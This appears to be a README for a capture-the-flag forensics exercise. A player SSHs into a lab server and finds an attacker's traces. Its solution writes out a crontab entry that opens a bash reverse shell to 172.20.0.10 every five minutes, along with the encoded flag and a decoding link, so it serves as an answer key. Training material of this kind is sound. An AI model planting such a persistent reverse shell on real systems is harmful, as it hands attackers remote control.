# Intrusion

A challenge where user SSHs into a machine and tries to find out what an attacker did in the server. 

### Task

The user should find a reverse shell in Charlie user's crontab aswell as a comment with a flag. The flag is rot13 encoded
so that it cannot be easily grepped.

## How to solve
<details>
  <summary>Click to reveal how to solve steps</summary>

**TODO: Make the steps more detailed**

1. The flag is stored in charlie's crontab in rot13 encoded form
```bash
root@hackerlab:~# ssh root@172.20.0.41 
root@172.20.0.41's password: 
Linux fd1dd0993ceb 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct 16 21:07:38 2024 from 172.20.0.2

root@fd1dd0993ceb:~# su charlie
charlie@fd1dd0993ceb:/root$ crontab -l
# Leave me here! OFL{9xCyoIOLhJgFkx6Bd62NNhLPyvaMp0PLnlZwSFq5BHccDkKCGLgT9uNnOwwW}
*/5 * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/172.20.0.10/678 0>&1"
```
2. Decode using eg. [cyberchef](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&input=T0ZMezl4Q3lvSU9MaEpnRmt4NkJkNjJOTmhMUHl2YU1wMFBMbmxad1NGcTVCSGNjRGtLQ0dMZ1Q5dU5uT3d3V30)

</details>

## Testing

The script [auto-solve.sh](./auto-solve.sh) automatically verifies that the challenge can be solved.
